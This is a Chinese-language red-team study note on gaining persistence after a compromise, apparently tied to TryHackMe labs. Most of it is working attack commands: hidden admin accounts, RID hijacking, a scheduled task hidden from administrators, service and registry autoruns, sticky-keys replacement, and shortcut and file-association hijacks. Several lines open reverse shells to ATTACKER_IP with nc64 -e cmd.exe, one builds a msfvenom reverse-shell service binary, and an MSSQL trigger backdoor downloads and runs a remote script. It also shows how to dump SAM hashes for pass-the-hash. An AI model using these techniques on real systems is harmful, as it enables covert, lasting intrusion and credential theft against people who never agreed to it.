
#### 一、 概述 (Overview)

权限维持是指在成功获得目标系统访问权限后，攻击者采用各种技术手段，以确保在系统重启、用户注销、凭据更改或初始访问点被修复后，仍能持续地、隐蔽地访问和控制目标系统。建立持久性是获得网络访问权限后首要执行的任务之一，其原因包括：

- **漏洞利用的不可重复性**: 某些漏洞利用过程可能导致服务崩溃，仅提供一次成功机会。
- **初始访问难以复现**: 如通过钓鱼获得的访问权限，再次复现可能耗时耗力且效果不佳。
- **蓝队反制**: 初始访问所用的漏洞可能被修补，攻击者需与时间赛跑。

虽然保留管理员密码哈希并在需要时重用是一种方法，但凭据可能被轮换。因此，采用更隐蔽的技术手段对于规避蓝队检测至关重要。持久化技术的核心在于创建替代性的访问路径，避免再次执行完整的利用链。

#### 二、 常用技术 (Common Techniques)

##### 1. 用户账户 (User Accounts)

通过操纵用户账户（包括无特权用户）是实现持久化的直接方式。

- **A. 创建新账户/修改现有账户**:
    
    - **原理**: 创建新的高权限用户，或利用、修改现有用户账户以备后续访问。
    - **步骤**:
        1. **创建新管理员用户**:
            
            Bash
            
            ```
            net user <user> <pass> /add && net localgroup administrators <user> /add
            ```
            
        2. **隐藏账户尝试**: 使用 `$` 结尾的用户名 (如 `admin$`) 在某些旧版系统图形界面中可能隐藏该账户，但命令行中依然可见。
        3. **激活禁用的管理员账户**:
            
            Bash
            
            ```
            net user administrator /active:yes
            ```
            
        4. **利用现有账户**: 获取服务账户、非活动账户的凭据。
- **B. 操纵无特权用户 (Windows)**:
    
    - **目标**: 利用普通用户账户，通过提升其权限或利用其特殊权限来实现持久访问，这通常比直接使用管理员账户更隐蔽。
    - **1. 指派组成员资格**:
        - **原理**: 将已知凭据的非特权用户添加到高权限组。
        - **步骤**:
            - **加入管理员组**:
                
                Bash
                
                ```
                C:\> net localgroup administrators thmuser0 /add
                ```
                
                允许通过 RDP、WinRM 等方式访问。
            - **加入备份操作员组 (Backup Operators)**:
                
                - 用户不直接拥有管理员权限，但允许读/写系统上任何文件或注册表键 (忽略 DACL)，可用于复制 SAM 和 SYSTEM 文件以提取哈希。 <!-- end list -->
                
                Bash
                
                ```
                C:\> net localgroup "Backup Operators" thmuser1 /add
                C:\> net localgroup "Remote Management Users" thmuser1 /add (允许 WinRM 访问)
                ```
                
                - **UAC 与 LocalAccountTokenFilterPolicy**: 远程登录时，UAC 默认会剥离本地账户的管理权限。需修改注册表以禁用此策略，使远程会话获得完整权限：
                    
                    Bash
                    
                    ```
                    C:\> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
                    ```
                    
                - 获取权限后，可通过 WinRM 连接，使用 `reg save hklm\system system.bak` 和 `reg save hklm\sam sam.bak` 备份 SAM 和 SYSTEM 文件，下载后用 `secretsdump.py` 提取哈希，进而使用 Pass-the-Hash 以管理员权限重新连接。
    - **2. 特殊权限和安全描述符**:
        - **原理**: 直接为用户分配特定权限 (如 `SeBackupPrivilege`, `SeRestorePrivilege`)，而无需改变其组成员身份。
        - **步骤 (使用 secedit)**:
            
            1. 导出当前配置: `secedit /export /cfg config.inf`
            2. 编辑 `config.inf` 文件，在 `SeBackupPrivilege` 和 `SeRestorePrivilege` 行添加目标用户名。
            3. 导入修改后的配置:
                
                Bash
                
                ```
                secedit /import /cfg config.inf /db config.sdb
                secedit /configure /db config.sdb /cfg config.inf
                ```
                
            
            <!-- end list -->
            - 修改 WinRM 服务安全描述符以允许该用户连接 (需 GUI 会话操作):
                
                PowerShell
                
                ```
                Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
                ```
                
                在弹出的窗口中添加用户并授予完全权限。
            - 同样需要注意 `LocalAccountTokenFilterPolicy` 的设置。
    - **3. RID 劫持 (克隆账户/僵尸攻击)**:
        - **原理**: 修改非特权用户的 RID (Relative Identifier)，使其与管理员账户的 RID (通常为 500) 相同。登录时，LSASS 会根据 RID 创建访问令牌，从而赋予非特权用户管理员权限。
        - **步骤**:
            1. 获取用户 SID 及 RID: `wmic useraccount get name,sid` (RID 是 SID 的最后一部分)。
            2. 以 SYSTEM 权限运行注册表编辑器: `C:\tools\pstools\PsExec64.exe -i -s regedit`。
            3. 导航到 `HKLM\SAM\SAM\Domains\Account\Users\`。找到目标用户对应的键 (其名称是用户 RID 的十六进制形式，如 1010 对应 `000003F2`)。
            4. 修改该键下的 `F` 值中位于 `0x30` 偏移处的二进制数据，将其改为管理员 RID (500 = `0x01F4`) 的小端字节序表示 (即 `F401`)。
            5. 用户下次登录时将获得管理员权限。

##### 2. 计划任务 (Scheduled Tasks)

- **原理**: 创建在特定时间（如系统启动、用户登录、固定间隔）或由特定事件触发执行恶意命令或程序的计划任务。
- **Windows**:
    - **命令**:
        
        Bash
        
        ```
        schtasks /create /tn "TaskName" /tr "C:\path\to\payload.exe" /sc ONSTART /ru SYSTEM /f
        ```
        
        (示例：系统启动时以 SYSTEM 权限运行 payload)
        
        Bash
        
        ```
        schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
        ```
        
        (示例：每分钟以 SYSTEM 权限运行反向 shell)
    - **查询任务**: `schtasks /query /tn <TaskName>`
    - **隐藏计划任务 (使其在查询中不可见)**:
        - **原理**: 删除任务的安全描述符 (SD)。
        - **步骤**: 使用 `PsExec64.exe -s -i regedit` 以 SYSTEM 权限打开注册表编辑器，删除 `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\<TaskName>`键下的 `SD` 值。删除后，即使是管理员也无法通过 `schtasks /query` 查看到该任务。
- **Linux**:
    - **命令**: `crontab -e` 编辑当前用户的 cron 作业。
    - **示例**: `* * * * * /path/to/payload` (每分钟执行)。

##### 3. 启动项 (Startup Items)

- **原理**: 将恶意程序的快捷方式、路径或脚本添加到系统的自启动位置，实现用户登录或系统启动时自动运行。
- **Windows**:
    - **A. 启动文件夹**:
        - **当前用户**: `C:\Users\<User>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`
        - **所有用户**: `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`
        - **操作**: 将恶意可执行文件 (如 `msfvenom` 生成的 payload) 复制到上述目录。
    - **B. 注册表 Run/RunOnce 键**:
        - `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
        - `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
        - `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
        - `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
        - (`Wow6432Node` 下有对应 32 位程序的键值)
        - **操作**: 在这些键下创建新的字符串值 (REG_SZ 或 REG_EXPAND_SZ)，名称任意，数据为恶意程序的完整路径。`Run` 键下程序每次登录执行，`RunOnce` 键下程序仅执行一次后自动删除该键值。
    - **C. Winlogon 注册表键**:
        - **原理**: Winlogon 组件在用户认证后加载用户配置。可利用其相关注册表键执行程序。
        - **位置**: `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\`
        - **键**:
            - `Userinit`: 指向 `userinit.exe`，负责恢复用户配置。可以追加逗号和恶意程序路径 (如 `C:\Windows\system32\userinit.exe,C:\Windows\payload.exe`)。
            - `Shell`: 指向系统外壳，通常是 `explorer.exe`。也可类似追加。
    - **D. 登录脚本 (通过环境变量)**:
        - **原理**: `userinit.exe` 会检查 `UserInitMprLogonScript` 环境变量。
        - **位置**: `HKCU\Environment`
        - **操作**: 创建名为 `UserInitMprLogonScript` 的字符串值，数据为恶意脚本或程序的路径。此方法仅对当前用户有效。
- **Linux**:
    - `.bashrc`, `.profile` (用户登录时执行)
    - `/etc/profile`, `/etc/bash.bashrc` (所有用户登录时执行)
    - `/etc/rc.local` (旧系统，系统启动末期执行)
    - Systemd service units (现代 Linux 系统首选)
    - XDG Autostart (桌面环境)

##### 4. 服务 (Services)

- **原理**: 创建或修改 Windows 服务，配置其可执行文件路径指向恶意程序，并设置服务为自动启动。服务通常以较高权限（如 SYSTEM）运行。
- **Windows**:
    - **A. 创建新服务**:
        - **命令**:
            
            Bash
            
            ```
            sc.exe create "ServiceName" binPath= "C:\path\to\payload.exe" start= auto DisplayName= "Legitimate Service Name" obj= "LocalSystem"
            sc.exe start "ServiceName"
            ```
            
            (注意 `binPath=` 和 `start=` 等号后的空格，`obj=` 指定运行账户)
        - **服务兼容的可执行文件**: 使用 `msfvenom -f exe-service` 生成的 payload。
            
            Bash
            
            ```
            msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
            sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
            ```
            
    - **B. 修改现有服务**:
        - **原理**: 重用现有（尤其是已禁用或不常用的）服务，以避免创建新服务被监控发现。
        - **步骤**:
            1. 查询服务列表: `sc.exe query state=all`
            2. 查询特定服务配置: `sc.exe qc <ServiceName>`
            3. 修改服务配置 (binPath, 启动类型, 运行账户):
                
                Bash
                
                ```
                sc.exe config <ExistingService> binPath= "C:\path\to\payload.exe" start= auto obj= "LocalSystem"
                ```
                

##### 5. 映像劫持与辅助功能后门 (Image File Execution Options - IFEO & Accessibility Features)

- **A. IFEO (Debugger)**:
    - **原理**: 利用注册表键 `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<process_name.exe>`。在此键下创建一个名为 `Debugger` 的字符串值，并将其数据设置为恶意程序的路径。当 `<process_name.exe>` 启动时，系统会先启动指定的 "Debugger"。
    - **优点**: 可以劫持系统自带程序，触发方式隐蔽。
    - **示例**: 劫持 `sethc.exe` (粘滞键), `Magnify.exe` (放大镜), `osk.exe` (屏幕键盘), `Utilman.exe` (轻松访问)。
- **B. 替换辅助功能程序 (如粘滞键 sethc.exe, Utilman.exe)**:
    - **原理**: 直接用 `cmd.exe` 或其他 payload 替换位于 `C:\Windows\System32\` 下的辅助功能程序（如 `sethc.exe`, `Utilman.exe`）。这些程序可以在登录屏幕通过特定快捷键（如按5次Shift激活 `sethc.exe`）或界面按钮以 SYSTEM 权限触发。
    - **步骤 (以 sethc.exe 为例)**:
        1. 获取文件所有权: `takeown /f c:\Windows\System32\sethc.exe`
        2. 授予修改权限: `icacls C:\Windows\System32\sethc.exe /grant Administrator:F`
        3. 复制 `cmd.exe` 替换原文件: `copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe`
    - **触发**: 在登录界面按5次Shift (for sethc) 或点击轻松访问按钮 (for Utilman)。

##### 6. 注册表其他修改 (Other Registry Modifications)

- **原理**: 利用注册表的其他键值实现持久化或辅助持久化。
- **示例**:
    - **RDP 端口修改**: 修改 RDP 服务的监听端口（默认 3389）。
        - 键: `HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp`
        - 值: `PortNumber` (DWORD)。
    - **AppInit_DLLs**: (位于 `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows`) 加载指定的 DLL 到几乎所有用户模式进程。**慎用，易被检测，且可能导致系统不稳定。**
    - **LocalAccountTokenFilterPolicy**: (已在用户账户部分提及) `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System` 下的 `LocalAccountTokenFilterPolicy` (DWORD) 设置为 `1`，用于使远程连接的本地管理员账户获得完整权限。

##### 7. 工具篡改/后门化与文件关联劫持 (Tool Tampering/Backdooring & File Association Hijacking)

- **A. 后门化可执行文件**:
    - **原理**: 替换系统上合法的可执行文件 (如 `PuTTY.exe`) 或用户常用工具为包含后门的版本。
    - **方法**: 使用 `msfvenom -x <original_exe> -k -p <payload_options> -f exe -o <backdoored_exe.exe>` 将 payload 注入现有可执行文件，尝试保持原功能。
    - **挑战**: 确保后门化工具功能正常，绕过文件完整性检查。
- **B. 快捷方式文件劫持**:
    - **原理**: 修改现有快捷方式 (.lnk) 的目标，使其指向一个恶意脚本，该脚本首先执行 payload，然后再启动原始程序。
    - **步骤**:
        1. 创建恶意脚本 (如 PowerShell 脚本 `backdoor.ps1`):
            
            PowerShell
            
            ```
            Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445" # 执行 payload
            C:\Windows\System32\calc.exe # 执行原始程序
            ```
            
        2. 修改快捷方式的目标为: `powershell.exe -WindowStyle hidden C:\path\to\backdoor.ps1`。
        3. 确保快捷方式图标与原始程序一致。
- **C. 文件关联劫持**:
    - **原理**: 修改注册表中特定文件扩展名（如 `.txt`）的默认打开方式，使其在用户打开该类型文件时先执行恶意代码，再用原程序打开文件。
    - **步骤**:
        1. 查找文件类型的 ProgID: 如 `.txt` 对应 `HKLM\Software\Classes\.txt` 默认值。
        2. 查找 ProgID 对应的打开命令: 如 `txtfile` 对应 `HKLM\Software\Classes\txtfile\shell\open\command` 默认值 (通常是 `NOTEPAD.EXE %1`)。
        3. 创建恶意脚本 (如 `backdoor2.ps1`):
            
            PowerShell
            
            ```
            Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
            C:\Windows\system32\NOTEPAD.EXE $args[0] # $args[0] 对应 %1
            ```
            
        4. 修改注册表中 `shell\open\command` 的默认值为: `powershell.exe -WindowStyle hidden C:\path\to\backdoor2.ps1 %1`。

##### 8. 特定应用后门 (Application-Specific Backdoors)

- **A. Web Shell**:
    - **原理**: 在 Web 服务器的 Web 根目录 (如 IIS 的 `C:\inetpub\wwwroot`) 上传一个服务端脚本 (如 ASPX, PHP, JSP shell)，通过浏览器访问该脚本即可执行命令。
    - **权限**: 通常以 Web 应用程池的账户权限运行 (如 `iis apppool\defaultapppool`)。该账户可能具有 `SeImpersonatePrivilege`，可用于提权。
    - **注意**: 需注意文件权限，确保 Web 服务器有权访问和执行该 shell 文件 (可能需要 `icacls shell.aspx /grant Everyone:F`)。
- **B. 数据库触发器后门 (以 MSSQL 为例)**:
    - **原理**: 在数据库中创建触发器，当特定数据库事件（如表数据插入、用户登录）发生时，自动执行恶意代码 (如通过 `xp_cmdshell` 执行系统命令)。
    - **步骤**:
        1. **启用 xp_cmdshell** (需 `sysadmin` 权限):
            
            SQL
            
            ```
            EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE;
            EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
            ```
            
        2. **授予执行权限** (可选，若 Web 应用用户非 sysadmin):
            
            SQL
            
            ```
            USE master;
            GRANT IMPERSONATE ON LOGIN::sa TO [Public]; -- 允许公共用户模拟 sa
            ```
            
        3. **创建触发器**:
            
            SQL
            
            ```
            USE TargetDB; -- 切换到目标数据库
            CREATE TRIGGER [sql_backdoor]
            ON dbo.TargetTable -- 目标表
            FOR INSERT -- 触发事件 (如 INSERT, UPDATE, DELETE, LOGON)
            AS
            BEGIN
                EXECUTE AS LOGIN = 'sa'; -- 尝试以 sa 身份执行
                EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1''')"'; -- 执行命令
            END;
            ```
            
            其中 `evilscript.ps1` 是攻击者控制的 PowerShell payload。

##### 9. 其他技术 (Others)

- **WMI 事件订阅 (WMI Event Subscription)**: 创建持久的 WMI 事件消费者，由特定事件触发执行恶意代码。
- **COM 劫持 (COM Hijacking)**: 劫持合法的 COM 对象注册信息，使其加载恶意 DLL。
- **DLL 劫持 (DLL Hijacking)**: 利用应用程序加载 DLL 的搜索顺序，将恶意 DLL 放置在优先搜索路径中，使其被合法程序加载。
- **BITS 持久化 (BITS Persistence)**: 利用后台智能传输服务 (BITS) 创建任务下载并执行 payload。
- **Office 模板宏 (Office Template Macros)**: 将恶意宏嵌入到全局 Office 模板中 (如 `Normal.dotm`)。
- **屏幕保护程序 (Screen Savers)**: 替换合法的屏幕保护程序 (`.scr` 文件) 为恶意程序。
- **LNK 文件自定义图标位置**: LNK 文件可以指定一个远程 UNC 路径作为图标文件，当用户浏览该 LNK 文件所在目录时，系统会尝试访问该 UNC 路径，可用于凭据捕获或探测。